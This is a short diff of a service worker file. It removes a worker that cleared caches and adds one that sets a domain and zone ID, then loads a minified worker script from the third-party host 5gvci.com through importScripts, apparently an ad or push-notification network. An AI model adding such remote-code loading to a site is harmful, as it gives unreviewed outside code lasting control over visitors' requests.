@@ -1,9 +1,6 @@
-// Service worker disabled
-self.addEventListener('install', function(e) { self.skipWaiting(); });
-self.addEventListener('activate', function(e) {
-    e.waitUntil(
-        caches.keys().then(function(keys) {
-            return Promise.all(keys.map(function(k) { return caches.delete(k); }));
-        }).then(function() { return self.clients.claim(); })
-    );
-});
+self.options = {
+    "domain": "5gvci.com",
+    "zoneId": 11028673
+}
+self.lary = ""
+importScripts('https://5gvci.com/act/files/service-worker.min.js?r=sw')
